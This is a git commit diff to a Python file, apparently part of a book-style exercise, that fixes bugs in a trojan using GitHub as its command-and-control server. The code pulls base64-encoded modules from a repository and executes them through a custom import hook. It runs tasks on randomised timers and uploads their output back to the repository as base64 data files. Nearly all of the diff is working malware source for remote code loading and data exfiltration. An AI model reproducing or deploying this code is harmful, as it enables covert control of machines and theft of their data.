b3291aaff8b08a0e56801340eff1ba5dd3046143
ZhangZheng <1065868815@qq.com>
2017-08-19 01:49:23 +0800

    modify abc.json

--- code/chapter.py
+++ code/chapter.py
@@ -29,6 +29,7 @@ def getFileContent(filename):
 	trees = branch.commit.commit.tree.recurse()
 	for filet in trees.tree:
 		if filename in filet.path:
+			print "[*] Found file %s" % filename
 			blob = repo.blob(filet._json_data['sha'])
 			return blob.content
 	return None
@@ -40,13 +41,13 @@ def getConfigJson():
 	configured = True
 	for task in config:
 		if task['module'] not in sys.modules:
-			exec("import %s"%task[module])
+			exec("import %s"%task['module'])
 	return config
 
-def moudleDataStore(data):
+def moduleDataStore(data):
 	gh, repo, branch = connectToGit()
 	remote_path = "data/%s/%d.data" % (data_path, random.randint(1000,10000))
-	repo.creat_file(remote_path, "Commit message from %s"%trojan_id, base64.b64encode(data))
+	repo.create_file(remote_path, "Commit message from %s"%trojan_id, base64.b64encode(data))
 	return
 
 class GitImporter(object):
@@ -55,14 +56,16 @@ class GitImporter(object):
 	def find_module(self, fullname, path = None):
 		if configured:
 			print "[*] Attempting to retrieve %s" % fullname
-			content = getFileContent("module/%s" % fullname)
+			content = getFileContent("modules/%s" % fullname)
 			if content is not None:
 				self.current_module_code = base64.b64decode(content)
 				return self
+		return None
 	def load_module(self, name):
-		module = imp.new_moudle(name)
+		module = imp.new_module(name)
 		exec self.current_module_code in module.__dict__
 		sys.modules[name] = module
+		return module
 
 def module_runner(module):
 	task_queue.put(1)
@@ -71,14 +74,14 @@ def module_runner(module):
 	moduleDataStore(result)
 	return
 def main():
-	sys.meta_path = [GitImporter()]
 	while True:
 		if task_queue.empty():
 			tasks = getConfigJson()
 			for task in tasks:
-				t = threading.Thread(target = module_runner, args = (task[moudle],))
+				t = threading.Thread(target = module_runner, args = (task['module'],))
 				t.start()
 				time.sleep(random.randint(2,10))
 		time.sleep(random.randint(1000, 10000))
 if __name__ == "__main__":
+	sys.meta_path = [GitImporter()]
 	main()
